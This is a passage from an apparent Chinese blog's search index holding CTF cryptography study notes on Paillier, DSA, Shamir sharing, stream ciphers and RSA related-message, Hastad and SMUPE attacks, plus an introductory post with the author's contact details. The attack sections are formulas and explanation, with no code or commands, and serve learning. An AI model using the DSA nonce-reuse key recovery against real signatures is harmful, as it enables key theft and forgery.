n)$</p><h1 id="同态性质"><a href="#同态性质" class="headerlink" title="同态性质"></a>同态性质</h1><p>$D(E(m_1,r_1)\cdot E(m_2,r_2))\ (mod\ n^2)=m_1+m2\ (mod\ n$)</p><p>$D(E(m,r)^k\ mod\ n^2)=km\ mod\ n$</p><h1 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h1><ul><li><p>同态性质攻击</p></li><li><p>选择明文攻击</p><p>参考：<a href="http://coinc1dens.me/2021/07/01/Some_other_cryptosystem.html">一些密码系统 - Coinc1dens’ Diary</a></p></li></ul><h1 id="DSA-System"><a href="#DSA-System" class="headerlink" title="DSA System"></a>DSA System</h1><p>与前面的不同，DSA算法是一种数字签名算法，一般不用于加解密</p><h2 id="密钥生成-2"><a href="#密钥生成-2" class="headerlink" title="密钥生成"></a>密钥生成</h2><p>1.选择合适的哈希函数，一般选择SHA-1</p><p>2.选择密钥的长度L和N，这两个值决定了签名的安全程度。一般来说L为64的倍数，且$512≤L≤1024$，N必须不大于哈希函数H输出的长度</p><p>3.选择N比特的素数q</p><p>4.选择L比特的素数p，使得$q|p-1$</p><p>5.选择满足$g^k\equiv1\ mod\ p$的最小正整数k为q的g（即g的阶为q）。在这里，我们可以通过计算$g\equiv h^{p-1\over q}\ mod\ p$来得到g，其中$1&lt;h&lt;p-1$.</p><p>6.选择私钥x，$0&lt;x&lt;q$，计算$y\equiv g^x\ mod\ p$</p><p>公钥为（p,q,g,y)，私钥为(x).</p><h2 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h2><p>签名步骤：</p><p>1.选择随机整数k作为临时密钥,$0&lt;k&lt;q$</p><p>2.计算$r\equiv(g^k\ mod\ p)\ mod\ q$</p><p>3.计算$s\equiv(H(m)+xr)k^{-1}\ mod\ q$</p><p>签名结果为（r，s）</p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>验证步骤：</p><p>1.计算辅助量，$w\equiv s^{-1}\ mod\ q$</p><p>2.计算辅助量，$u_1\equiv H(m)w\ mod\ q$</p><p>3.计算辅助量，$u_2\equiv rw\ mod\ q$</p><p>4.计算$v\equiv (g^{u_1}y^{u_2}\ mod\ p)\ mod\ q$</p><p>5.如果有$v=r$，则验证成功</p><h2 id="攻击方法-1"><a href="#攻击方法-1" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="k泄露"><a href="#k泄露" class="headerlink" title="k泄露"></a>k泄露</h3><p>如果我们知道了k，那么我们可以获取私钥为：</p><script type="math/tex; mode=display">x\equiv r^{-1}(ks-H(m))\ mod\ q</script><h3 id="k共享"><a href="#k共享" class="headerlink" title="k共享"></a>k共享</h3><p>如果在两次签名过程使用了同一个k，这时我们可以攻击。</p><p>假设签名的消息为$m_1,m_2$，显然，两者的r值相同，我们还有：</p><script type="math/tex; mode=display">s_1\equiv (H(m_1)+xr)k^{-1}\ mod\ q</script><script type="math/tex; mode=display">s_2\equiv (H(m_2)+xr)k^{-1}\ mod\ q</script><p>化为：</p><script type="math/tex; mode=display">s_1k\equiv H(m_1)+xr</script><script type="math/tex; mode=display">s_2k\equiv H(m_2)+xr</script><p>两式相减</p><script type="math/tex; mode=display">k(s_1-s_2)\equiv H(m_1)-H(m_2)\ mod\ q</script><p>此时我们可以解出k，进一步可以解出x</p><h3 id="进阶攻击方法"><a href="#进阶攻击方法" class="headerlink" title="进阶攻击方法"></a>进阶攻击方法</h3><p>MSB泄露攻击（HNP问题的方法），借助格和LLL算法，待补充</p><h1 id="Shamir’s-Secret-Sharing-Algorithm"><a href="#Shamir’s-Secret-Sharing-Algorithm" class="headerlink" title="Shamir’s Secret Sharing Algorithm"></a>Shamir’s Secret Sharing Algorithm</h1><p>基于拉格朗日插值法（也可理解为方程组的秩）</p><p>(m,n)门限方案指的是任意持有一部分密钥的m个人都能解密，而任何少于m个人都不能解密</p><p>参考链接：<a href="http://coinc1dens.me/2021/07/01/Some_other_cryptosystem.html#shamirs-secret-sharing-algorithm">一些密码系统 - Coinc1dens’ Diary</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>本文参考：</p><p>CTF WIKI</p><p><a href="http://coinc1dens.me/2021/07/01/Some_other_cryptosystem.html#shamirs-secret-sharing-algorithm">一些密码系统 - Coinc1dens’ Diary</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Crypto</category>
      
      <category>理论学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>流密码</title>
    <link href="/2021/09/06/%E6%B5%81%E5%AF%86%E7%A0%81/"/>
    <url>/2021/09/06/%E6%B5%81%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="流密码综述"><a href="#流密码综述" class="headerlink" title="流密码综述"></a>流密码综述</h1><p>流密码又称为序列密码，它是密码学的一个重要部分。在CTF的密码学中，流密码一般都以以下的几种情形出现：</p><ul><li><p>线性同余发生器（LCG）</p></li><li><p>MT19937（python随机数库的预测）</p></li><li><p>线性反馈移位寄存器（LFSR）和非线性反馈移位寄存器（NFSR）</p></li><li><p>RC4</p><p>其中，重点和难点应该是在LFSR和它所衍生出的一系列算法。下面总结一下流密码。</p><h1 id="线性同余发生器（LCG）"><a href="#线性同余发生器（LCG）" class="headerlink" title="线性同余发生器（LCG）"></a>线性同余发生器（LCG）</h1><p>形如$X_{n+1}\equiv aX_n+b\ (mod\ m)$（$X_0为已知种子$），若$gcd(a,m)=1$，则LCG可以取得最大周期（遍历所有可能结果）。</p><h2 id="一般题型"><a href="#一般题型" class="headerlink" title="一般题型"></a>一般题型</h2><p>对于LCG的一般情况下的攻击可分为两类，一类是a,b未知，另一类是a,b,m都未知。</p><p>对于前者，我们只需要知道连续的三个生成值，即可通过解模线性方程组求解。</p><p>对于后者，已知连续的五个生成值，我们可以通过构造模等比数列，再通过求gcd的方法求得m的值，接下来的过程就很好办了。</p><p>参考链接：<a href="https://zeroyu.xyz/2018/11/02/Cracking-LCG/">攻击线性同余生成器(LCG) (zeroyu.xyz)</a></p><h2 id="创新题型"><a href="#创新题型" class="headerlink" title="创新题型"></a>创新题型</h2><p>在Van1sh神的blog里面，有一篇介绍HNP（Hidden Number Probem）的文章,题目给出了a,b,m的值，生成了20个128位的随机数，但是只给出了每个数的高64位，然后题目的重点是恢复原来的seed。关于HNP问题的内容仍在学习中，等学明白了再将这一块更新。先给出V神文章链接：</p><p><a href="https://www.anquanke.com/post/id/204846">浅尝lattice之HNP</a></p><h1 id="python随机数——MT19937"><a href="#python随机数——MT19937" class="headerlink" title="python随机数——MT19937"></a>python随机数——MT19937</h1><p>CTF一般随机数攻击方法：爆破或者预测</p><p>预测python随机数的库：randcrack</p><p>可在泄露624个连续随机数后进行预测</p><h1 id="线性反馈移位寄存器（LFSR）"><a href="#线性反馈移位寄存器（LFSR）" class="headerlink" title="线性反馈移位寄存器（LFSR）"></a>线性反馈移位寄存器（LFSR）</h1><p>这一块一般题型都不难，但是水比较深，涉及到很多代数知识和分析方法如Galois理论还有GF（2）域上的多项式代数以及相关攻击、快速相关攻击、B-M算法，这段时间把这些都学会。</p><p>待更新。</p><h1 id="非线性反馈移位寄存器（NFSR）"><a href="#非线性反馈移位寄存器（NFSR）" class="headerlink" title="非线性反馈移位寄存器（NFSR）"></a>非线性反馈移位寄存器（NFSR）</h1><p>待更新。</p><h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><p>待更新。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Crypto</category>
      
      <category>理论学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>相关消息攻击</title>
    <link href="/2021/09/02/%E7%9B%B8%E5%85%B3%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB/"/>
    <url>/2021/09/02/%E7%9B%B8%E5%85%B3%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><p>本文介绍的是相关消息攻击。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><p><a href="https://ycdxsb.cn/2decc525.html">https://ycdxsb.cn/2decc525.html</a></p></li><li><p><a href="https://xz.aliyun.com/t/6813#toc-2">https://xz.aliyun.com/t/6813#toc-2</a></p></li><li><p>《Low-Exponent RSA with Related Messages 》by Coppersmith, Franklin, Patarin and Reiter</p></li><li><p>《Solving Systems of Modular Equations in OneVariable: How Many RSA-Encrypted MessagesDoes Eve Need to Know?》by Alexander May, Maike Ritzenhofent</p><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><ul><li><p>RSA原理</p></li><li><p>lattice和LLL算法</p></li><li><p>多项式代数</p><h2 id="使用工具-库"><a href="#使用工具-库" class="headerlink" title="使用工具/库"></a>使用工具/库</h2><ul><li>sagemath</li><li>python的gmpy2库</li></ul></li></ul><h1 id="线性相关消息"><a href="#线性相关消息" class="headerlink" title="线性相关消息"></a>线性相关消息</h1></li></ul><h2 id="k-2（k为消息数）"><a href="#k-2（k为消息数）" class="headerlink" title="k=2（k为消息数）"></a>k=2（k为消息数）</h2><p>假设两则相关消息满足：</p><script type="math/tex; mode=display">(a_1m+b_1)^e \equiv c_1\ (mod\ n)\\(a_2m+b_2)^e \equiv c_2\ (mod\ n)</script><p>那么模多项式$(a_1m+b_1)^e-c_1\ (mod\ n)$和$(a_2m+b_2)^e-c_2\ (mod\ n)$一般来说会存在一个形如<script type="math/tex">m-m_0</script>的$gcd$，对这两个多项式在模n下求$gcd$，得到$m-m_0$，$m_0$即为我们要求的$m$。对于这两个多项式$gcd$不为线性函数的情况，本文暂不讨论。</p><h2 id="k-gt-2（k为消息数"><a href="#k-gt-2（k为消息数" class="headerlink" title="k&gt;2（k为消息数)"></a>k&gt;2（k为消息数)</h2><p>假设k则消息之间满足多项式：</p><script type="math/tex; mode=display">p(x_1,x_2,...,x_k)=0</script><p>并且有：</p><script type="math/tex; mode=display">p_1(x_1)=x_1^e-c_1=0\ (mod\ n)</script><script type="math/tex; mode=display">p_2(x_2)=x_2^e-c_2=0\ (mod\ n)</script><script type="math/tex; mode=display">...</script><script type="math/tex; mode=display">p_i(x_i)=x_i^e-c_i=0\ (mod\ n)</script><script type="math/tex; mode=display">...</script><script type="math/tex; mode=display">p_k(x_k)=x_k^e-c_k=0\ (mod\ n)</script><p>然后我们求出它们的Groebner基，即可求</p><p>得$x_i=m_i$，对于这k个式子，可求出k个解，这k个解即为我们要找的解。</p><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>通过我们的的操作可以看出，其实这里并不局限于线性相关，在这里多项式相关都是可以的，所以此处改为“多项式相关消息”可能更准确。</p><h1 id="Hastad广播攻击"><a href="#Hastad广播攻击" class="headerlink" title="Hastad广播攻击"></a>Hastad广播攻击</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>前面介绍的相关消息攻击模数都是一样的，Hastad广播攻击中则对模数不同的攻击进行了讨论。</p><h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>对于使用不同的但是互素的模数n，相同的加密指数e，加密e个明文得到e个密文：</p><script type="math/tex; mode=display">(a_ix+b_i)^e \equiv c_i\ (mod\ n_i)\ ,\ i=1,2,...,e</script><p>由于模数互素，我们通过多项式的中国剩余定理，可以得到$P(x)\equiv 0\ (mod\ M)，M=\prod_{i=1}^en_i$，$P(x)$存在唯一解，并且这个解满足LLL算法的条件，所以我们可以据此求出解，得到x，恢复明文。</p><h1 id="SMUPE问题"><a href="#SMUPE问题" class="headerlink" title="SMUPE问题"></a>SMUPE问题</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>无论是前面的线性相关消息攻击（多项式相关消息攻击），还是Hastad广播攻击，我们尽管使用了不同的模数n，但我们使用的指数e都是一样的。在SMUPE问题（systems of modular univariate polynomial equations）中，我们使用的加密指数e也可以不同，如：</p><script type="math/tex; mode=display">(a_ix+b_i)^{e_i}\equiv c_i\ (mod\ n_i)\ ,\ i=1,2,...,k\\记f_i(x)=(a_ix+b_i)^{e_i}</script><p>此时由于模数不同，我们无法直接使用中国剩余定理，因此需要构造同阶的多项式。</p><p>为了构造这样的多项式，Hastad采取了两边同时乘$(a_ix+b_i)^{\delta-\delta_i}$的方法来统一阶数，其中$\delta$为最高次数。</p><p>而在论文《Solving Systems of Modular Equations in OneVariable: How Many RSA-Encrypted MessagesDoes Eve Need to Know?》by Alexander May, Maike Ritzenhofent 中，他们提出了另外一种更有效的平衡阶数的方法，用阶数的最小公倍数来构造（在这里$\delta_i$的意义和$e_i$一样）：</p><script type="math/tex; mode=display">[f_i(x)]^{\delta/\delta_i}\equiv c_i^{\delta/\delta_i}\ (mod\ n_i)\ , \ i=1,2,...,k\ ,\ \delta=lcm(\delta_j,j=1,2,...,k)</script><p>这里的所有多项式都是首一的多项式（$monic\ polynomial$）.</p><p>此时可以用中国剩余定理解决，作者们证明了这种攻击能够成功的条件为（满足LLL算法的条件）：</p><script type="math/tex; mode=display">\sum_{i=1}^k1/\delta_i≥1</script><hr><p>本文对相关消息攻击的讨论大致就如上所述，本文为理论性学习文章，因此不涉及代码部分，解题方面还需移步CTF-Crypto-题目实践。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Crypto</category>
      
      <category>理论学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Love_DengFeng&#39;s Blog</title>
    <link href="/2021/08/30/Love_DengFeng&#39;s%20Blog/"/>
    <url>/2021/08/30/Love_DengFeng&#39;s%20Blog/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><hr><p><strong><em>2021年8月29日</em></strong>，我终于把自己很早之前的想法付诸实践了——搭建一个自己的博客站点，来记录自己的学习历程，同时分享一些个人的想法以及学习的内容来跟各位 $dalao$ 互相交流学习。<strong><em>8月30日</em></strong>，大概熟悉了博客的管理运行发布删除等操作以及用 $markdown$ 写博客的方法后，写下这第一篇博客来开启我的学习记录路程。最近几个月的重心应该还是会放在 $CTF$ 的 $Crypto$ 方向上，提高自己的水平，期待自己能得到更大的提升。</p><script type="math/tex; mode=display">联系方式：</script><script type="math/tex; mode=display">QQ:1440416491</script><script type="math/tex; mode=display">E-mail:1440416491@qq.com</script><p>这是<a href="https://www.zhihu.com/people/deng-feng-10-87-48">我的知乎</a>，里面记录了一些数论的理论，dalao们不妨关注一波，<del>给我加一点关注量</del>说不定能学到一点点东西。</p><p>欢迎各路$dalao$交流学习！</p>]]></content>
    
    
    <categories>
      
      <category>introduction</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
